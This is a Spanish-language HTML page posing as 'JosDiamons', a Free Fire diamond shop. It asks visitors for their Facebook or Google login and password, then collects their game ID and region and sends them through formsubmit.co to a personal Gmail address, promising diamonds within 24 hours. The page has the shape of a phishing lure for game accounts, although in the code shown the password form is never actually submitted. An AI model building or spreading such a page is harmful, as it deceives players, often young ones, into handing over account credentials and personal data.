<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>JosDiamons - Tienda Free Fire</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-image: url('fondo.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: white;
      text-shadow: 1px 1px 2px black;
    }

    .container {
      max-width: 400px;
      margin: auto;
      padding: 20px;
      background-color: rgba(0, 0, 0, 0.6);
      border-radius: 10px;
      margin-top: 40px;
    }

    h2 {
      text-align: center;
      color: #ffcc00;
    }

    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }

    input, select, button {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: none;
      margin-bottom: 10px;
    }

    button {
      background-color: #00cc66;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    .seccion {
      display: none;
    }

    .visible {
      display: block;
    }

    .cuentas {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin-bottom: 15px;
    }

    .cuentas button {
      flex: 1;
      background-color: #3366ff;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>Bienvenido a JosDiamons</h2>

    <div id="login" class="seccion visible">
      <p>Inicia sesión con tu cuenta de Free Fire:</p>
      <div class="cuentas">
        <button onclick="seleccionarCuenta('Facebook')">Facebook</button>
        <button onclick="seleccionarCuenta('Google')">Google</button>
      </div>
      <form id="loginForm" onsubmit="mostrarCompra(event)">
        <label for="usuario">Usuario</label>
        <input type="text" id="usuario" name="usuario" required />
        <label for="clave">Contraseña</label>
        <input type="password" id="clave" name="clave" required />
        <input type="hidden" id="cuentaSeleccionada" name="cuenta" />
        <button type="submit">Iniciar sesión</button>
      </form>
    </div>

    <div id="compra" class="seccion">
      <form action="https://formsubmit.co/muriilloventee@gmail.com" method="POST" onsubmit="mostrarGracias(event)">
        <h3>Selecciona tu paquete</h3>
        <label>
          <input type="radio" name="diamantes" value="100 diamantes" required /> 100 diamantes
        </label>
        <label>
          <input type="radio" name="diamantes" value="200 diamantes" /> 200 diamantes
        </label>
        <label>
          <input type="radio" name="diamantes" value="350 diamantes" /> 350 diamantes
        </label>

        <label for="idjuego">Tu ID del juego</label>
        <input type="text" name="idjuego" required />

        <label for="region">Selecciona tu región</label>
        <select name="region" required>
          <option value="">Elige una región</option>
          <option value="EEUU">EEUU</option>
          <option value="Norte">Norte</option>
        </select>

        <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html" />
        <button type="submit">Enviar</button>
      </form>
    </div>

    <div id="gracias" class="seccion">
      <h3>¡Congratulations!</h3>
      <p>Gracias por usar nuestro servicio y confiar en nosotros.</p>
      <p>Tu recompensa estará llegando en cuanto revisemos tu pedido.</p>
      <p><strong>Espera de unas 5 a máximo 24 horas.</strong></p>
    </div>
  </div>

  <script>
    function seleccionarCuenta(cuenta) {
      document.getElementById('cuentaSeleccionada').value = cuenta;
    }

    function mostrarCompra(event) {
      event.preventDefault();
      document.getElementById('login').classList.remove('visible');
      document.getElementById('compra').classList.add('visible');
    }

    function mostrarGracias(event) {
      event.preventDefault();
      document.getElementById('compra').classList.remove('visible');
      document.getElementById('gracias').classList.add('visible');
      setTimeout(() => event.target.submit(), 3000);
    }
  </script>

</body>
  </html>
